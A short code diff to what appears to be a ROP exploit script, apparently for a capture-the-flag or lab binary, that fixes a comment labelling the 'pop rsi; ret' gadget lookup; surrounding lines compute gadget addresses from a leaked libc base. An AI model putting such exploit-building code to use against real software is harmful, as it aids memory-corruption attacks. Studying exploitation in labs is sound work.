@@ -71,7 +71,7 @@ def main():
     pop_rdi_offset = r.find_gadget(['pop rdi', 'ret']).address
     pop_rdi_addr = pop_rdi_offset + libc_base
 
-    # pop rdi gadget
+    # pop rsi gadget
     pop_rsi_offset = r.find_gadget(['pop rsi', 'ret']).address
     pop_rsi_addr = pop_rsi_offset + libc_base
 
